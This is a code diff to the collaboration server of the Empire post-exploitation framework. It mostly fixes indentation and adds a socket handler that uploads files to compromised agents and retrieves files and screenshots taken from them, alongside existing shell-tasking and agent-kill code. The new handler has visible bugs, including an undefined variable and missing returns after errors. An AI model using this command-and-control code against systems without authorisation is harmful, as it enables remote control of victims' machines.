@@ -15,6 +15,7 @@ import stagers
 import credentials
 import plugins
 import users
+from files import fetcher
 from events import log_event
 from zlib_wrapper import compress
 from zlib_wrapper import decompress
@@ -61,13 +62,15 @@ class Server():
         # Agent results cache/buffer
         self.historyBuffer = {}
 
+        
+
         # empty database object
         self.conn = self.database_connect()
         time.sleep(1)
 
-	# initiate socketio
+	    # initiate socketio
         self.app = Flask(__name__)
-	self.socketio = SocketIO(self.app, async_mode='threading')
+        self.socketio = SocketIO(self.app, async_mode='threading')
         self.lock = threading.Lock()
         (self.isroot, self.installPath, self.ipWhiteList, self.ipBlackList, self.obfuscate, self.obfuscateCommand) = helpers.get_config('rootuser, install_path,ip_whitelist,ip_blacklist,obfuscate,obfuscate_command')
         self.args = args
@@ -81,6 +84,7 @@ class Server():
         self.resourceQueue = []
         #A hashtable of autruns based on agent language
         self.autoRuns = {}
+        self.fetcher = fetcher(self, args=args)
 
         # print the loading menu
         messages.loading()
@@ -196,7 +200,7 @@ class Server():
         #
         #   
         #    - There are custom events for each menu/class per se:
-        #    - listeners, modules, agents, stagers
+        #    - listeners, modules, agents, stagers, files
         #    - Data sent from the client for any custom event should be in the following json format
         #    * - required arguments
         #
@@ -218,9 +222,15 @@ class Server():
         #           - VIEW   --- Name
         #           - KILL   --- Name*
         #           - INTERACT --- Name*
-        #           - EXECUTE --- Name*,Command*
+        #           - EXECUTE --- Name*,Command
         #           - RETURN --- Name*
         #
+        #   Event - files
+        #         - Action: UPLOAD, DOWNLOAD, VIEW
+        #         - Arguments _____________
+        #           - VIEW --- file_type* (module_output, download, screenshot)
+        #           - UPLOAD --- sessionID*, file_data* (base64 encoded), filename*
+        #           - DOWNLOAD --- fileID*
         #
         #   Event - stagers
         #         - Action: VIEW, EXECUTE
@@ -273,10 +283,10 @@ class Server():
 
             if self.users.is_authenticated(request.sid):
                 if data['Action'] and data['Action'] == 'VIEW':
-		    users = self.users.get_users()
-		    emit('users', {"Result":users})
+                    users = self.users.get_users()
+                    emit('users', {"Result":users})
         
-	@self.socketio.on('stagers')
+        @self.socketio.on('stagers')
         def handle_stagers_event(data):
             """
             Handles all client messages for the 'stagers' event
@@ -365,7 +375,8 @@ class Server():
 
                     for activeAgent in results:
                         [nonce, jitter, results, servers, internal_ip, working_hours, session_key, children, functions, checkin_time, hostname, ID, delay, username, kill_date, parent, process_name, listener, process_id, profile, os_details, lost_limit, taskings, name, language, external_ip, session_id, lastseen_time, language_version, high_integrity] = activeAgent.values()
-			agents.append({"ID":ID, "session_id":session_id, "listener":listener, "name":name, "language":language, "language_version":language_version, "delay":delay, "jitter":jitter, "external_ip":external_ip, "internal_ip":internal_ip, "username":username, "high_integrity":high_integrity, "process_name":process_name, "process_id":process_id, "hostname":hostname, "os_details":os_details, "session_key":session_key.decode('latin-1').encode("utf-8"), "nonce":nonce, "checkin_time":checkin_time, "lastseen_time":lastseen_time, "parent":parent, "children":children, "servers":servers, "profile":profile,"functions":functions, "kill_date":kill_date, "working_hours":working_hours, "lost_limit":lost_limit, "taskings":taskings, "results":results})
+                        agents.append({"ID":ID, "session_id":session_id, "listener":listener, "name":name, "language":language, "language_version":language_version, "delay":delay, "jitter":jitter, "external_ip":external_ip, "internal_ip":internal_ip, "username":username, "high_integrity":high_integrity, "process_name":process_name, "process_id":process_id, "hostname":hostname, "os_details":os_details, "session_key":session_key.decode('latin-1').encode("utf-8"), "nonce":nonce, "checkin_time":checkin_time, "lastseen_time":lastseen_time, "parent":parent, "children":children, "servers":servers, "profile":profile,"functions":functions, "kill_date":kill_date, "working_hours":working_hours, "lost_limit":lost_limit, "taskings":taskings, "results":results})
+                    
                     emit('agents',{'Result':agents})
 
                 elif data['Action'] and data['Action'] == 'VIEW' and data['Arguments']['Name']:
@@ -380,7 +391,7 @@ class Server():
                     emit('agents',{'Results':agents})
                 
                 elif data['Action'] and data['Action'] == 'KILL' and data['Arguments']['Name']:
-		    agent_name = data['Arguments']['Name']
+                    agent_name = data['Arguments']['Name']
                     userName = self.users.get_user_from_sid(request.sid)
                     if agent_name.lower() == "all":
                         agentNameIDs = self.agents.get_agent_ids_db()
@@ -390,10 +401,10 @@ class Server():
                     if not agentNameIDs or len(agentNameIDs) == 0:
                         send({'Result': 'agent name {} not found'.format(agent_name)})
 		   
-		    if isinstance(agentNameIDs,basestring):
-			agentNameIDs = agentNameIDs.split() 
-                   
-		    for agentNameID in agentNameIDs:
+                    if isinstance(agentNameIDs,basestring):
+                        agentNameIDs = agentNameIDs.split() 
+                        
+                    for agentNameID in agentNameIDs:
                         agentSessionID = agentNameID
 
                         # task the agent to exit
@@ -403,10 +414,10 @@ class Server():
                         self.agents.save_agent_log(agentSessionID, msg)
                         self.agents.add_agent_task_db(agentSessionID, 'TASK_EXIT')
 
-                    send({'Result':msg})
+                        send({'Result':msg})
 
                 elif data['Action'] and data['Action'] == 'EXECUTE' and data['Arguments']['Name']:
-		    agent_name = data['Arguments']['Name']
+                    agent_name = data['Arguments']['Name']
                     userName = self.users.get_user_from_sid(request.sid)
                     if agent_name.lower() == "all":
                         agentNameIDs = self.agents.get_agent_ids_db()
@@ -422,9 +433,9 @@ class Server():
                     command = data['Arguments']['Command']
 
                     if not isinstance(agentNameIDs,list):
-			agentNameIDs = agentNameIDs.split()
+                        agentNameIDs = agentNameIDs.split()
 
-		    for agentNameID in agentNameIDs:
+                    for agentNameID in agentNameIDs:
                         # add task command to agent taskings
                         msg = "tasked agent {} to run command {}".format(agentNameID, command)
                         self.agents.save_agent_log(agentNameID, msg)
@@ -432,9 +443,9 @@ class Server():
                         self.users.log_user_event("{} tasked agent {} to run command {}".format(username, agentNameID, command))
                     	self.socketio.emit('message', {"Result":"{} tasked agent {} to run command {}".format(username, agentNameID, command)})
                         #Update other users console with the command
-                	results = {'Agent':agentNameID,"Result":command,"User":username}
-			self.socketio.emit('agentCommand', {"Result":results}, include_self=False)
-			taskID = self.agents.add_agent_task_db(agentNameID, "TASK_SHELL", command)
+                        results = {'Agent':agentNameID,"Result":command,"User":username}
+                        self.socketio.emit('agentCommand', {"Result":results}, include_self=False)
+                        taskID = self.agents.add_agent_task_db(agentNameID, "TASK_SHELL", command)
 
                     #self.socketio.emit('message', {"Result":"Success - TaskID: {}".format(taskID)})
 
@@ -446,12 +457,12 @@ class Server():
                         send({'Result': 'agent name {} not found'.format(agent_name)})
 
                     else:
-			# Grab the agent log file                        
-			logPath = os.path.abspath("./downloads/%s/agent.log" % agentNameIDs)
-			logFile = open(logPath,'r')
-			logResults = unicode(logFile.read(), errors='replace')
-			self.socketio.emit('agentData', {'Result': {'Agent':agentNameIDs,'Result':logResults}})
-			#join_room(agentNameIDs)
+                        # Grab the agent log file                        
+                        logPath = os.path.abspath("./downloads/%s/agent.log" % agentNameIDs)
+                        logFile = open(logPath,'r')
+                        logResults = unicode(logFile.read(), errors='replace')
+                        self.socketio.emit('agentData', {'Result': {'Agent':agentNameIDs,'Result':logResults}})
+                        #join_room(agentNameIDs)
                         # Get the results history for this agent from the cache
                         #agentResults = self.historyBuffer[agentNameIDs].getvalue()
                         #result = json.dumps({
@@ -486,7 +497,7 @@ class Server():
 
                     for activeListener in activeListenersRaw:
                         listenerObject = self.listeners.activeListeners[activeListener]
-			name = activeListener
+                        name = activeListener
                         module = listenerObject['moduleName']
                         ID = self.listeners.get_listener_id(activeListener)
                         options = listenerObject['options']
@@ -578,7 +589,64 @@ class Server():
 
             else:
                 emit('listeners',{'Result':'Authorization required'})
+        
+        @self.socketio.on("files")
+        def handle_files_event(data):
+            """
+            Handles all client messages for the 'files' events
+            """
+            if self.users.is_authenticated(request.sid):
+                if data['ACTION'] and data['ACTION'] == 'VIEW' and (data['Arguments']['file_type']):
+                    results = self.fetcher.get_files_by_type(file_type=data['Arguments']['file_type'])
+                    emit('files',{'Result':results})
 
+                elif (data['ACTION'] and data['ACTION'] == 'UPLOAD') and (data['Arguments']['file_data']):
+                    raw_data = helpers.decode_base64(data['Arguments']['file_data'])
+                    sessionID = data['Arguments']['sessionID']
+                    filename = data['Arguments']['filename']
+
+                    if self.agents.is_agent_present(sessionID):
+                        lang = self.agents.get_language_db(sessionID)
+                    else:
+                        emit('files',{'Result':'Agent doesn\'t exist'})
+                    
+                    if helpers.get_file_size(raw_data) > 1048576:
+                        emit('files',{'Result':'File is too large. Upload limit is 1MB'})
+                    
+                    if lang.startswith('po'):
+                        username = self.users.get_user_from_sid(request.sid)
+                        self.users.log_user_event("{} tasked agent to upload {} : {}".format(username, filename, helpers.get_file_size(raw_data)))
+
+                        raw_data = helpers.encode_base64(raw_data)
+                        taskdata = filename + "|" + raw_data
+                        self.agents.add_agent_task_db(sessionID, "TASK_UPLOAD", taskdata)
+                        emit('files',{'Result':'Tasked agent to upload file'})
+                    elif lang.startswith('py'):
+                        username = self.users.get_user_from_sid(request.sid)
+                        self.users.log_user_event("{} tasked agent to upload {} : {}".format(username, filename, helpers.get_file_size(raw_data)))
+
+                        # compress data before we base64
+                        c = compress.compress()
+                        start_crc32 = c.crc32_data(raw_data)
+                        comp_data = c.comp_data(raw_data, 9)
+                        raw_data = c.build_header(comp_data, start_crc32)
+                        # get final file size
+                        raw_data = helpers.encode_base64(raw_data)
+
+                        # upload packets -> "filename | script data"
+                        taskdata = filename + "|" + raw_data
+                        self.agents.add_agent_task_db(sessionID, "TASK_UPLOAD", taskdata)
+                        emit('files',{'Result':'Tasked agent to upload file'})
+
+                elif (data['ACTION'] and data['ACTION'] == 'DOWNLOAD') and (data['Arguments']['fileID']):
+                    """
+                    Download files shown in the files table from the server. Not directly from agents
+                    """
+                    enc_file = self.fetcher.get_file(fileID=data['Arguments']['fileID'])
+                    if enc_file != None:
+                        emit('files',{'Result':enc_file})
+                    else:
+                        emit('files',{'Result':""})
 
         # wrap the Flask connection in SSL and start it
         certPath = os.path.abspath("./data/")
@@ -598,7 +666,7 @@ class Server():
             print helpers.color("[+] Empire Collaboration Server started:\n Host => 0.0.0.0 \n Port => {} \n Password => {}".format(self.args.port, self.args.shared_password))
             #self.socketio.run(self.app, host='0.0.0.0', port=int(self.args.port))
             self.socketio.run(self.app, host='0.0.0.0', port=int(self.args.port), ssl_context=context)
-	except KeyboardInterrupt:
+        except KeyboardInterrupt:
             print helpers.color("[+] Shutting down server")
             sys.exit()
         
